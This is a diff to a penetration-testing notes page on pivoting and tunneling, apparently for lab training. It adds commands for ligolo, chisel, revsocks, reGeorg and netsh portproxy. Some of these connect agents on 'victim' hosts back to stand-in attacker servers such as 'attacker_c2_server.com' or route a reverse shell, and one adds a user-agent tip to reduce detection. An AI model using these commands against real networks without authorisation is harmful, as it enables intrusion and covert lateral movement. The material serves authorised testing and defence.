@@ -4,8 +4,8 @@ type: technique
 tags: [htb, lateral-movement, linux, network, pivoting, port-forwarding, thm, tunneling, windows]
 phase: post-exploitation
 date_created: 2026-05-08
-date_updated: 2026-05-08
-sources: [cpts-pivoting, thm-ad-lateral]
+date_updated: 2026-09-10
+sources: [cpts-pivoting, thm-ad-lateral, InternalAllTheThings]
 ---
 
 # Pivoting, Tunneling & Port Forwarding
@@ -55,6 +55,24 @@ route print
 arp -a
 type C:\Windows\System32\drivers\etc\hosts
 ```
+
+---
+
+## Tools Comparison
+
+Comparison table showing platform support (Windows, Linux, macOS), available polling methods (HTTPS, WebSockets), and supported SOCKS versions (4/5).
+
+| Name         | SOCKS4 | SOCKS5 | SOCKET | HTTPS | Web Socket | Windows | Linux | MacOS  | Tun Interface |
+| ------------ | ------ | ------ | ------ | ----- | ---------- | ------- | ----- | -----  | ------------  |
+| SSH          |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
+| reGeorg      |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
+| pivotnacci   |     ✅ |     ✅ |     ❌ |    ✅ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
+| wstunnel     |     ✅ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
+| chisel       |     ❌ |     ✅ |     ❌ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
+| revsocks     |     ❌ |     ✅ |     ✅ |    ✅ |         ✅ |     ✅  |   ✅  |     ✅ |           ❌ |
+| ligolo-ng    |     ❌ |     ❌ |     ✅ |    ❌ |         ✅ |     ✅  |   ✅  |     ✅ |           ✅ |
+| gost         |     ✅ |     ✅ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ✅ |
+| rpivot       |     ✅ |     ❌ |     ✅ |    ❌ |         ❌ |     ✅  |   ✅  |     ✅ |           ❌ |
 
 ---
 
@@ -185,6 +203,17 @@ proxychains ssh -i id_rsa ubuntu@172.16.5.25            # double pivot — SSH a
 ```
 
 > **Note:** nmap ICMP ping (`-sn`) and SYN scans (`-sS`) do not work through SOCKS. Always use `-Pn -sT` for TCP scanning through proxychains.
+
+---
+
+### In-Session Forwarding (~C Escape Sequence)
+
+Inside an already established SSH session, press `~C` to opens an interactive mode to add local (-L), remote (-R), or dynamic (-D) port forwards. `-D` currently cannot be added after connection. Only `-L` or `-R` work reliably. Dynamic forwarding inside an existing session is not supported by OpenSSH.
+
+```ps1
+~C
+-L 1080:127.0.0.1:1080
+```
 
 ---
 
@@ -399,6 +428,24 @@ sudo ip route add 10.10.10.0/24 dev ligolo
 start
 ```
 
+### Console Command Variant
+
+* [sysdream/ligolo](https://github.com/sysdream/ligolo) - Reverse Tunneling made easy for pentesters.
+
+```ps1
+./proxy -h # Help options
+./proxy -autocert # Automatically request LetsEncrypt certificates
+./proxy -selfcert # Use self-signed certificates
+./agent -connect attacker_c2_server.com:11601
+
+ligolo-ng » session 
+? Specify a session : 1
+
+interface_create --name ligolo
+route_add --name ligolo --route 10.24.0.0/24
+tunnel_start --tun ligolo
+```
+
 ---
 
 ## Chisel
@@ -534,9 +581,33 @@ netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 netsh advfirewall firewall add rule name="Pivot 8080" dir=in action=allow protocol=TCP localport=8080
 ```
 
+```powershell
+netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
+netsh interface portproxy add v4tov4 listenport=3340 listenaddress=10.1.1.110 connectport=3389 connectaddress=10.1.1.110
+```
+
+```powershell
+# Forward the port 4545 for the reverse shell, and the 80 for the http server for example
+netsh interface portproxy add v4tov4 listenport=4545 connectaddress=10.10.10.44 connectport=4545
+netsh interface portproxy add v4tov4 listenport=80 connectaddress=10.10.10.44 connectport=80
+```
+
+1. listenaddress – is a local IP address waiting for a connection.
+2. listenport – local listening TCP port (the connection is waited on it).
+3. connectaddress – is a local or remote IP address (or DNS name) to which the incoming connection will be redirected.
+4. connectport – is a TCP port to which the connection from listenport is forwarded to.
+
 ---
 
 ## proxychains Configuration
+
+### SOCKS Compatibility Table
+
+| SOCKS Version | TCP   | UDP   | IPv4  | IPv6  | Hostname |
+| ------------- | :---: | :---: | :---: | :---: | :---:    |
+| SOCKS v4      | ✅    | ❌    | ✅    | ❌    | ❌       |
+| SOCKS v4a     | ✅    | ❌    | ✅    | ❌    | ✅       |
+| SOCKS v5      | ✅    | ✅    | ✅    | ✅    | ✅       |
 
 `/etc/proxychains.conf` (or `/etc/proxychains4.conf`):
 
@@ -578,6 +649,168 @@ proxychains python3 exploit.py
 proxychains curl -s http://172.16.5.25/
 proxychains impacket-smbclient //172.16.5.25/share -U Administrator%Pass123
 proxychains impacket-wmiexec Administrator:'Pass123'@172.16.5.25
+```
+
+* [rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng) - a preloader which hooks calls to sockets in dynamically linked programs and redirects it through one or more socks/http proxies. continuation of the unmaintained proxychains project.
+* [haad/proxychains](https://github.com/haad/proxychains) - a tool that forces any TCP connection made by any given application to follow through proxy like TOR or any other SOCKS4, SOCKS5 or HTTP(S) proxy. Supported auth-types: "user/pass" for SOCKS4/5, "basic" for HTTP.
+
+Edit the **configuration file** `/etc/proxychains.conf` to add the SOCKS proxies.
+
+```bash
+[ProxyList]
+# socks4 localhost 8080
+socks5 localhost 8081
+```
+
+Uncomment `proxy_dns` to also proxify DNS requests.
+
+```ps1
+proxychains nmap -sT 10.10.10.10
+proxychains curl http://10.10.10.10
+```
+
+---
+
+## Proxifier
+
+Proxifier allows network applications that do not support working through proxy servers to operate through a SOCKS or HTTPS proxy and chains.
+
+* [proxifier](https://www.proxifier.com/) - The Most Advanced Proxy Client
+
+Open Proxifier, go to **Profile** -> **Proxy Servers** and **Add a new proxy entry**, which will point at the IP address and Port of your SOCKS proxy.
+
+Go to **Profile** -> **Proxification Rules**. This is where you can add rules that tell Proxifier when and where to proxy specific applications. Multiple applications can be added to the same rule.
+
+---
+
+## Graftcp
+
+* [hmgle/graftcp](https://github.com/hmgle/graftcp) - A flexible tool for redirecting a given program's TCP traffic to SOCKS5 or HTTP proxy.
+
+:warning: Same as proxychains, with another mechanism to "proxify" which allow Go applications.
+
+```ps1
+# Create a SOCKS5, using Chisel or another tool and forward it through SSH
+(attacker) $ ssh -fNT -i /tmp/id_rsa -L 1080:127.0.0.1:1080 root@IP_VPS
+(vps) $ ./chisel server --tls-key ./key.pem --tls-cert ./cert.pem -p 8443 -reverse 
+(victim 1) $ ./chisel client --tls-skip-verify https://IP_VPS:8443 R:socks 
+
+# Run graftcp and specify the SOCKS5
+(attacker) $ graftcp-local -listen :2233 -logfile /tmp/toto -loglevel 6 -socks5 127.0.0.1:1080
+(attacker) $ graftcp ./nuclei -u http://10.10.10.10
+```
+
+Simple configuration file for graftcp: [example-graftcp-local.conf](https://github.com/hmgle/graftcp/blob/master/local/example-graftcp-local.conf)
+
+```py
+## Listen address (default ":2233")
+listen = :2233
+loglevel = 1
+
+## SOCKS5 address (default "127.0.0.1:1080")
+socks5 = 127.0.0.1:1080
+# socks5_username = SOCKS5USERNAME
+# socks5_password = SOCKS5PASSWORD
+
+## Set the mode for select a proxy (default "auto")
+select_proxy_mode = auto
+```
+
+---
+
+## wstunnel
+
+* [erebe/wstunnel](https://github.com/erebe/wstunnel) - Tunnel all your traffic over Websocket or HTTP2 - Bypass firewalls/DPI - Static binary available
+
+```ps1
+wstunnel server wss://[::]:8080
+wstunnel client -L socks5://127.0.0.1:8888 --connection-min-idle 5 wss://myRemoteHost:8080
+curl -x socks5h://127.0.0.1:8888 http://google.com/
+```
+
+---
+
+## revsocks
+
+* [kost/revsocks](https://github.com/kost/revsocks) - Reverse SOCKS5 implementation in Go
+
+Reverse SOCKS using websocket
+
+```ps1
+revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls -ws
+revsocks -connect https://clientIP:8443 -pass SuperSecretPassword -ws
+```
+
+Reverse SOCKS using TLS encryption
+
+```ps1
+revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword
+revsocks -connect clientIP:8443 -pass SuperSecretPassword
+```
+
+Reverse SOCKS using TCP
+
+```ps1
+revsocks -listen :8443 -socks 127.0.0.1:1080 -pass SuperSecretPassword -tls
+revsocks -connect clientIP:8443 -pass SuperSecretPassword -tls
+```
+
+* Set a strong password on the connection: `-pass Password1234`
+* Use an authenticated proxy: `-proxy proxy.domain.local:3128 -proxyauth Domain/userpame:userpass`
+* Define a User-Agent to reduce detections: `-useragent "Mozilla 5.0/IE Windows 10"`
+
+---
+
+## reGeorg
+
+* [sensepost/reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
+
+```python
+python reGeorgSocksProxy.py --listen-port 8080 --url http://compromised.host/shell.jsp
+```
+
+* **Step 1**. Upload tunnel.(`aspx|ashx|jsp|php`) to a webserver.
+* **Step 2**. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py
+
+---
+
+## pivotnacci
+
+* [blackarrowsec/pivotnacci](https://github.com/blackarrowsec/pivotnacci), a tool to make socks connections through HTTP agents.
+
+```powershell
+pip3 install pivotnacci
+usage: pivotnacci [-h] [-s addr] [-p port] [--verbose] [--ack-message message]
+                  [--password password] [--user-agent user_agent]
+                  [--header header] [--proxy [protocol://]host[:port]]
+                  [--type type] [--polling-interval milliseconds]
+                  [--request-tries number] [--retry-interval milliseconds]
+                  url
+
+pivotnacci  https://domain.com/agent.php --password "s3cr3t" --polling-interval 2000
+```
+
+---
+
+## gost
+
+* [ginuerzh/gost](https://github.com/ginuerzh/gost) - GO Simple Tunnel - a simple tunnel written in golang
+
+```ps1
+gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
+gost -L=socks5://:1080 # server
+gost -L=:8080 -F=socks5://server_ip:1080?notls=true # client
+```
+
+---
+
+## sshuttle
+
+* [sshuttle/sshuttle](https://github.com/sshuttle/sshuttle) - Transparent proxy server that works as a poor man's VPN. Forwards over ssh.
+
+```ps1
+sshuttle -vvr user@10.10.10.10 10.1.1.0/24
+sshuttle -vvr root@10.10.10.10 10.1.1.0/24 -e "ssh -i ~/.ssh/id_rsa" 
 ```
 
 ---
@@ -625,6 +858,55 @@ Each agent connects to the same proxy binary. Add different routes for each sess
 
 ---
 
+## Network Capture
+
+### TCPDump
+
+* [the-tcpdump-group/tcpdump](https://github.com/the-tcpdump-group/tcpdump)
+
+```ps1
+# capture and save the output inside 0001.pcap
+tcpdump -w 0001.pcap -i eth0
+
+# capture and display packet in ASCII
+tcpdump -A -i eth0
+
+# capture every TCP packet on interface eth0
+tcpdump -i eth0 tcp
+
+# capture everything on port 22
+tcpdump -i eth0 port 22
+```
+
+### Netsh
+
+* Start a capture use the netsh command.
+
+```ps1
+netsh trace start capture=yes report=disabled tracefile=c:\trace.etl maxsize=16384
+```
+
+* Stop the trace
+
+```ps1
+netsh trace stop
+```
+
+* Event tracing
+
+```ps1
+netsh trace start capture=yes report=disabled persistent=yes tracefile=c:\trace.etl maxsize=16384
+etl2pcapng.exe c:\trace.etl c:\trace.pcapng
+```
+
+* Use filters
+
+```ps1
+netsh trace start capture=yes report=disabled Ethernet.Type=IPv4 IPv4.Address=10.200.200.3 tracefile=c:\trace.etl maxsize=16384
+```
+
+---
+
 ## Detection and Defence
 
 | Technique | Detection signals |
@@ -647,6 +929,19 @@ Each agent connects to the same proxy binary. Add different routes for each sess
 
 ---
 
+## References
+
+* [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
+* [Etat de l’art du pivoting réseau en 2019 - Oct 28,2019 - Alexandre ZANNI](https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/)
+* [GO Simple Tunnel - Documentation](https://gost.run/en/)
+* [Ligolo-ng - Documentation](https://docs.ligolo.ng/)
+* [Overview of network pivoting and tunneling [2022 updated] - Alexandre ZANNI](https://blog.raw.pm/en/state-of-the-art-of-network-pivoting-in-2019/)
+* [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
+* [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin - November 10, 2015](https://web.archive.org/web/20151205120607/https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
+* [Windows: Capture a network trace with builtin tools (netsh) - Michael Albert - February 22, 2021](https://michlstechblog.info/blog/windows-capture-a-network-trace-with-builtin-tools-netsh/)
+
+---
+
 ## Tools
 
 - [[metasploit]] — autoroute, socks_proxy, portfwd
@@ -660,6 +955,8 @@ Each agent connects to the same proxy binary. Add different routes for each sess
 - dnscat2 — DNS tunneling
 - netsh — Windows built-in port proxy
 - proxychains — force tools through SOCKS/HTTP proxy
+- [[chisel]]
+- [[ligolo-ng]]
 
 ---
 
@@ -671,3 +968,4 @@ Each agent connects to the same proxy binary. Add different routes for each sess
 - Chisel: https://github.com/jpillora/chisel
 - rpivot: https://github.com/klsecservices/rpivot
 - dnscat2: https://github.com/iagox86/dnscat2
+- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
